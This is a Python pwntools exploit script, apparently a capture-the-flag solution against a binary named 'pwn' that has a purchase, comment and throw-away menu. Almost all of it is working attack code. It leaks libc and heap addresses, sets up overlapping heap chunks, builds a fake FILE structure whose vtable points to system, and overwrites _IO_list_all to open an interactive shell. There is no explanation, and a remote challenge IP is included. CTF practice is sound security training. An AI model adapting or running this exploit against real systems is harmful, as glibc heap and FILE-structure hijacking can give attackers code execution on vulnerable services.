from pwn import *
context(
    log_level='debug',
    os='linux',
    arch='amd64',
    binary='./pwn'
)
e = context.binary
libc = e.libc
ip = '47.111.59.243' 
port = 10001
io = process()
#io = remote(ip, port)
#====================================================================
def sh():
    io.interactive()
def menu(cmd):
    io.sendlineafter('>>> ', str(cmd))
def purchase(length, name, price=0):
    menu(1)
    io.sendlineafter('length: ', str(length))
    io.sendlineafter('Name: ', name)
    io.sendlineafter('ce: ', str(price))
def comment(idx, content, score):
    menu(2)
    io.sendlineafter('dex: ', str(idx))
    io.sendafter(' : ', content)
    io.sendlineafter(': ', str(score))
def throwit(idx):
    menu(3)
    io.sendlineafter(': ', str(idx))
#====================================================================
libc_leak_off = 0x1b2761
heap_leak_off = 0x120
free_hook_off = libc.symbols['__free_hook']
malloc_hook_off = libc.symbols['__malloc_hook']
system_off = libc.symbols['system']
stdin_io_off = libc.symbols['_IO_2_1_stdin_']
io_list_all_off = libc.symbols['_IO_list_all']
one_shoot_off = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]
#====================================================================
purchase(0x14, '0'*0x10) #0
comment(0, 'a'*0x8c, 0)
purchase(0x14, '1'*0x10) #1
comment(1, 'b'*0x8c, 0)
purchase(0x14, '2'*0x10) #2
throwit(0)
throwit(1)
purchase(0x14, '0'*0x10) #0
comment(0, 'a', 0)
throwit(0)
io.recvuntil('Comment ')
libc_base = u32(io.recv(4)) - libc_leak_off
system = libc_base + system_off
free_hook = libc_base + free_hook_off
malloc_hook = libc_base + malloc_hook_off
stdin_io = libc_base + stdin_io_off
heap_base = u32(io.recv(4)) - heap_leak_off
io_list_all = libc_base + io_list_all_off
one_shoot = libc_base + one_shoot_off[5]
purchase(0x14, '0'*0x10) #0
comment(0, 'a'*0x8c, 0)
purchase(0x14, '1'*0x10) #1
comment(1, 'b'*0x8c, 0)
purchase(0x14, '3'*0x10) #3
purchase(0x14, '4'*0x10) #4
throwit(2)
throwit(3)
purchase(0x34, 'aaaa') #2
payload = 'b'*0xf8
payload += p32(0x100)
purchase(0x104, payload) #3
purchase(0xf4, 'cccc') #5
payload = '!'*0x28
payload += p32(0) + p32(0x41)
purchase(0x34, payload) #6
throwit(2)
throwit(3) 
payload = 'a'*0x34
purchase(0x34, payload) #2
purchase(0x60, 'bbbb') #3
payload = 'd'*8
payload += p32(0) + p32(0x39)
purchase(0x34, payload) #7
purchase(0x3c, '.'*0x30) #8
throwit(7) #get victim 
throwit(3)
throwit(5) #merge
payload = 'a'*0x60
payload += p32(0) + p32(0x19)
payload += p32(0)*4
payload += p32(0) + p32(0x39)
payload += p32(heap_base + 0x308)
purchase(0x90, payload) #3
throwit(4)
fake_jump = heap_base + 0x318
fake_stdout = 'sh\x00\x00' + p32(0x31) + p32(0xdeadbeef)*2
fake_stdout += p32(0) + p32(1) + p32(0xc0)*2
fake_stdout += p32(0) + p32(0)*3
fake_stdout += p32(0) + p32(0) + p32(1) + p32(0)
fake_stdout += p32(0xffffffff) + p32(0) + p32(libc_base+0x1b3870) + p32(0xffffffff)
fake_stdout += p32(0xffffffff) + p32(0) + p32(libc_base + 0x1b24e0) + p32(0)
fake_stdout += p32(0)*2 + p32(0) + p32(0)
fake_stdout += p32(0)*4
fake_stdout += p32(0)*4
fake_stdout += p32(0) + p32(fake_jump)
payload = p32(0)*2
payload += p32(0) + p32(0x39)
payload += '\x00\x00\x00'
purchase(0x34, payload) #5
payload = p32(0) + p32(0x169)
payload += p32(libc_base + 0x1b27b0) + p32(io_list_all - 0x8)
purchase(0x34, payload) #7
payload = p32(0)*2 + p32(system)*4*2 + p32(system)*2
payload += fake_stdout
#dbg()
menu(1)
io.sendlineafter('length: ', str(352))
io.sendlineafter('Name: ', payload)
io.sendlineafter('Price: ', str(1))
menu(2)
io.sendline('5')
success('libc base: '+hex(libc_base))
success('heap base: '+hex(heap_base))
sh()